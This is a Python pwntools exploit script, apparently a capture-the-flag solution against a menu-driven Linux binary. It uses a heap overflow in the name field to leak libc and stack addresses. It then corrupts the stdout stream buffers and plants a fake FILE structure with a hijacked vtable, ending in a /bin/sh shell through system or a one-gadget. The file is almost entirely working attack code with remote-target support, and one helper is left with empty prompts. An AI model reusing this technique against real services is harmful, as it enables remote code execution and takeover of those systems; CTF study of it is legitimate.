#! /usr/bin/python
from pwn import *
# log_level = "debug"
context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["xfce4-terminal", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = ""
PORT = 1234

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def set_name(p, value):
    sl(p, b"1")
    sla(p, b"name:", value)
    ru(p, b"Choice:") 

def write_script(p, value):
    sl(p,b"2")
    sla(p, b"masterpiece:", value)
    ru(p,b"Choice:")

def delete(p, index):
    sl(p,b"")
    sla(p, b"", "%i" % index)
    ru(p, b"")

def view(p):
    sl(p,b"3")
    
    ru(p,b"reference:\n")
    ret = ru(p, b"1.")
    ru(p, b"Choice:")
    
    return ret[:-3]

def read_addr(io, addr):
    payload = b"A" * 0x28 + p64(0x1e1) + b"B"*8 + p64(addr)
    set_name(io, payload)

    return view(io)

def exploit(io,e,l):
    leak = read_addr(io, 0x404010)
    libc = int.from_bytes(leak, "little") - l.sym["_IO_2_1_stdout_"] 

    print(f"============= Libc leak: {hex(libc)}")
    
    leak = read_addr(io, l.sym["environ"] + libc)
    stack = int.from_bytes(leak, "little") 

    print(f"============= Stack leak: {hex(stack)}")

    # buf base and buf end overflow on the write stream 
    payload = b"A"*0x28 + p64(0x1e1) + b"B"*0x1d8 + p64(0x1e1) 
    payload += p64(0xfbad2c84)
    payload += p64(l.sym["_IO_2_1_stdout_"] + libc)
    payload += p64(0) * 5
    payload += p64(l.sym["_IO_2_1_stdout_"] + libc)
    payload += p64(l.sym["_IO_2_1_stdout_"] + libc + 0x200)
    
    write_script(io, b"balls")
    set_name(io, payload)

    # create a fake file struct to use when calling the write stream
    file = FileStructure()
    file._IO_read_end = l.sym["system"] + libc # it needs a value in here
    file._IO_save_base = libc + 0x163830 # one gadget <======== this gets called
    file._IO_write_end = u64(b"/bin/sh\x00")
    file._lock = libc + 0x21ba70
    file._codecvt = l.sym["_IO_2_1_stdout_"] + libc + 0xb8
    file._wide_data = l.sym["_IO_2_1_stdout_"] + libc + 0x200
    
    # modify the address of the vtable
    file.unknown2 = p64(0)*2 + p64(l.sym["_IO_2_1_stdout_"] + libc + 0x20) + p64(0)*3 + p64(l.sym["_IO_wfile_jumps"] + libc - 0x18) 

    #write_script(io, bytes(file))
    sla(io, b"Choice:", b"2")
    io.sendline(bytes(file))
    
    io.interactive()


if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")

    exploit(p,e,l)
